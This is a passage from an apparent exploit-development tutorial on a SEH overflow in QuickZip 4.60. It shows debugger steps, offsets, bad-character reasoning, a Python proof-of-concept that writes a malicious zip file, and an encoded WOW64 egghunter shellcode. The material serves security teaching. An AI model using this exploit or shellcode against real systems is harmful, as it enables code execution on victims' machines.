<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/2.Second%20crash.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/2.Second%20crash.png" alt="image" /></a></p>

<p>Hmm, the crash looks a bit different. The problem here is that <code>LEAVE</code> instruction tries to jump back to <code>0EEDFADE</code> address from the stack, which is an invalid memory address for this program.</p>

<p>Also, it doesn&rsquo;t appear that we&rsquo;re controlling the SEH anymore.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/3.second%20crash%20-%20wrong%20SEH.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/3.second%20crash%20-%20wrong%20SEH.png" alt="image" /></a></p>

<p>However, notice that we&rsquo;re actually in a kernel module (see the name of the Immunity window - <em>&ldquo;CPU - main thread, module KERNELBA&rdquo;</em>). Pass the execution back to the program with <code>SHIFT + F9</code> and see if we trigger another exception, but in the QuickZip module.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/4.proper%20crash.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/4.proper%20crash.png" alt="image" /></a></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/5.proper%20SEH.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/5.proper%20SEH.png" alt="image" /></a></p>

<p>Awesome, looks like we&rsquo;re back in business!</p>

<p>Use the following command to let mona calculate all of the offsets:
<code>
!mona findmsp
</code></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/6.mona%20findmsp.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/6.mona%20findmsp.png" alt="image" /></a></p>

<p>At this stage, the most interesting offset for us is <code>nSEH field: offset 292</code>.</p>

<p>Let&rsquo;s update the PoC with offsets information and try to trigger the crash again.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">nseh_offset</span>     <span class="c"># padding for nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>               <span class="c"># nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">CCCC</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>               <span class="c"># SEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for the rest of payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/7.SEH%20properly%20overwritten.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/7.SEH%20properly%20overwritten.png" alt="image" /></a></p>

<p>Great, we have control of the SEH! Let&rsquo;s pass exception to the program (<code>SHIFT + F9</code>) and investigate further what happens.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/8.SEH%20pop-pop-ret%20STACK%20view.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/8.SEH%20pop-pop-ret%20STACK%20view.png" alt="image" /></a></p>

<p>Of course another exception triggered, since <code>43434343</code> is an invalid memory address for this program, but let&rsquo;s see what happens on the stack - typically for SEH overflows, we&rsquo;ll need invoke a set of <em>POP-POP-RET</em> instructions to return to our buffer.</p>

<p>It&rsquo;ll be easy to find such instructions with <code>mona</code>, but first, we have to know what characters are we actually allowed to use. And that&rsquo;s where the problems start&hellip;</p>

<h2>Badchars</h2>

<p>Well, in summary, it&rsquo;s most of them. Why? Because our overflow is on the filename parameter and filenames are quite restricted - generally ASCII printable characters only.</p>

<p>Since it would take way too long to actually manually go through it with mona and try to find all bad chars, I just assumed that I can only use pretty much entire ASCII table (characters up to 0x7F) except <code>0x00</code>, <code>0x0a</code> and <code>0x0d</code> (<code>NULL</code> byte, new line and carriage-return respectively).</p>

<p>This assumption may make it more difficult than it really is (since I may be avoiding characters that are actually OK to use) or may cause me even more problems later if some of the characters from my assumed range are, in fact, incorrect.</p>

<p>I don&rsquo;t really like making assumptions like this, but for the sake of this exercise, let&rsquo;s make an exception.</p>

<p>I will just need to remember to be careful and if something doesn&rsquo;t work, to double check bad chars once again. A bit risky, but well, bring it on!</p>

<h2>POP-POP-RET</h2>

<p>Let&rsquo;s find an exploit-friendly address of a <em>POP-POP-RET</em> instructions with mona:
<code>
!mona seh
</code></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/9.pop-pop-ret-mona.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/9.pop-pop-ret-mona.png" alt="image" /></a></p>

<p>A lot of results are found (7909!), but the highlighted result looks promising - consists of all aphanumerical characters and is located in the <code>QuickZip.exe</code> binary itself, hopefully making it more cross-platform friendly as we don&rsquo;t need to rely on specific operating system DLLs.</p>

<p>The only problem here is the <code>0x00</code> byte, however, because of the address space of the program, every address starts with <code>0x00</code>&hellip; let&rsquo;s try and see if it&rsquo;ll actually break our exploit.</p>

<p>Update the PoC exploit replacing <code>CCCC</code> currently representing SEH with <code>\x33\x28\x42\x00</code>, trigger the crash once again and investigate SEH chain.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/10.SEH%20chain%20with%20pop-pop-ret.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/10.SEH%20chain%20with%20pop-pop-ret.png" alt="image" /></a></p>

<p>Great, looks like our address wasn&rsquo;t scrambled and looks like we expected it to look. Set the breakpoint at it (<code>F2</code>) and press <code>SHIFT + F9</code> to pass the control to the program.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/11.pop-pop-ret%20instructions.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/11.pop-pop-ret%20instructions.png" alt="image" /></a></p>

<p>As you can see, we&rsquo;re redirected to <em>POP-POP-RET</em> instructions, let&rsquo;s step through them with <code>F8</code> and stop after <code>RETN 4</code> instruction.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png" alt="image" /></a></p>

<p>Awesome, we have landed back in our payload&hellip; but there&rsquo;s a problem. Because of the <code>NULL</code> byte, everything after SEH chain got cut off, not leaving us much space to do anything at all.</p>

<h2>Where did the shellcode go?!</h2>

<p>OK, let&rsquo;s analyse the situation and see where are we at.</p>

<p>We get our crash and we control SEH, great! The problem is that we&rsquo;re limited to a very restricted set of characters to use with our payload and, because we had to use address with <code>NULL</code> byte to invoke <em>POP-POP-RET</em> instructions, signifcant portion of our payload got cut off and the remaining space for our shellcode is not very big at all.</p>

<p>But how big is it exactly? Remember that we still have the padding we used at the beginning of our payload to get to SEH:</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/13.before%20landing%20in%20SEH.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/13.before%20landing%20in%20SEH.png" alt="image" /></a></p>

<p>So how much space do we have? Exactly <strong>292</strong> bytes. Unfortunately it is not enough for any useful shellcode that would also need to be encoded to only contain ASCII printable characters.</p>

<p>This sounds like something that could be potentially solved with an egghunter!</p>

<p><strong>Egghunter</strong> is simply a bunch of instructions that look for a specific, known sequence of bytes (an &ldquo;egg&rdquo;) in the memory space of the program and, once it&rsquo;s found, redirects exection to that area.</p>

<p>This way, we don&rsquo;t really need to worry where our shellcode ends up, we can just call egghunter routine and it&rsquo;ll find it for us!</p>

<p>Sounds great, but the next question is, does the &lsquo;cut off&rsquo; portion of the payload actually ends up anywhere in the memory? Let&rsquo;s find out.</p>

<p>Let&rsquo;s generate pattern of <strong>3764</strong> unique characters (to fill in our payload after the <code>NULL</code> byte) and replace existing A&rsquo;s with it.
<code>
!mona pc 3764
</code></p>

<p>Let&rsquo;s trigger the crash and, as we get our first exception, do not pass the exception to the program, but instead invoke the following command to search for the previously generated pattern in memory:
<code>
!mona findmsp
</code></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/14.rest%20of%20payload%20in%20memory.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/14.rest%20of%20payload%20in%20memory.png" alt="image" /></a></p>

<p>Fantastic! The entire &lsquo;cut off&rsquo; portion of the payload is still in the memory, so we should be able to successfully use the egghunter to get to our shellcode.</p>

<h2>Egghunter</h2>

<p>So now we know that we should be able to use an egghunter to get to our shellcode, but we only have <strong>292</strong> bytes at our disposal. We can actually do quite a lot with 292 bytes, however, we need to remember that we can only use very limited character set.</p>

<p>Let&rsquo;s try to encode the egghunter with metasploit&rsquo;s <code>x86/alpha_mixed</code> encoder and see how much space we&rsquo;ll have left after this.</p>

<p>Firstly, let&rsquo;s generate egghunter payload. Remember that we&rsquo;re dealing with 64-bit OS, so we need to use appropriate egghunter routine as well (a lot more detailed information on it can be found on <a href="https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/">https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/</a>):</p>

<pre><code>!mona egghunter -wow64
</code></pre>

<p>Copy the generated bytes into a text file and convert it into a binary file using <code>xxd</code>:</p>

<pre><code># cat egghunter-wow64.txt 
31db53535353b3c06681caff0f42526a265833c98bd464ff135e5a3c0574e9b8773030748bfaaf75e4af75e1ffe7
# cat egghunter-wow64.txt | xxd -r -p &gt; egghunter-wow64.bin
</code></pre>

<p>Now, we need to use an encoder to ensure only ASCII printable characters are actually used.</p>

<pre><code># msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
[*] x86/alpha_mixed succeeded with size 146 (iteration=1)

buf = 
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" +
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" +
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b" +
"\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36" +
"\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a" +
"\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74" +
"\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44" +
"\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b" +
"\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51" +
"\x6b\x4f\x79\x77\x41\x41"
</code></pre>

<p><em>Note:</em> I have used <code>bufferedregister=eax</code> option. The reason being is that the encoder needs to find where it is in the memory to be able to carry on with decoding the payload. Originally, the routines responsible for doing this are not in the ASCII printable set and therefore would be breaking our payload.</p>

<p>Specifying <code>bufferregister</code> option basically tells the encoder not to worry about finding its own place in memory as we&rsquo;ll do it beforehand and we&rsquo;ll put its address in the EAX register. This way, our encoded egghunter is purely ASCII characters only (more information on generating alphanumeric shellcode can be found <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>).</p>

<p>Let&rsquo;s update our PoC exploit to reflect what we have done so far.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfencode</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">bufferregister</span><span class="o">=</span><span class="n">eax</span> <span class="o">-</span><span class="n">i</span> <span class="n">egghunter</span><span class="o">-</span><span class="n">wow64</span><span class="o">.</span><span class="n">bin</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">146</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
